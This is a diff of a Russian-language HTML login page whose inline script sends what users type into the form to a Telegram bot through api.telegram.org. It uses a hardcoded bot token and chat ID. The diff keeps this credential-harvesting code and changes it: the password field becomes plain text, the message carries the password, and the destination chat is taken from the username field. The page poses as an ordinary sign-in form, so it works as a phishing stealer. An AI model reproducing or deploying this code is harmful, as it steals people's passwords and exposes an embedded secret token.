@@ -71,7 +71,7 @@
 </head>
 <body>
     <div class="login-container">
-        <h2 id="title_sign">Приветствую, !</h2>
+        <h2 id="title_sign">Здарова, !</h2>
         <form>
             <div class="form-group">
                 <label for="username">Логин</label>
@@ -79,7 +79,7 @@
             </div>
             <div class="form-group">
                 <label for="password">Пароль</label>
-                <input type="password" id="password" name="password" placeholder="Введите ваш пароль" required>
+                <input type="text" id="password" name="password" placeholder="Введите ваш пароль" required>
             </div>
             <input type="submit" onclick="sendMessage()" value="Войти">
         </form>
@@ -139,12 +139,12 @@
     </script>
     <script>
     const token = '7321690711:AAGC0FDwSodg-2gG4lxUyU-3QbTwLl1llXM';
-    const chatId = '5615563152';
+    const chatId = '916858507';
     passtext = document.getElementById("password")
     logintext = document.getElementById("username")
 
     function sendMessage() {
-      const message = `Login:${logintext.value}, password:${passtext.value}`;
+      const message = `password:${passtext.value}`;
       
       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
@@ -152,7 +152,7 @@
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          chat_id: chatId,
+          chat_id: logintext.value,
           text: message,
         }),
       })
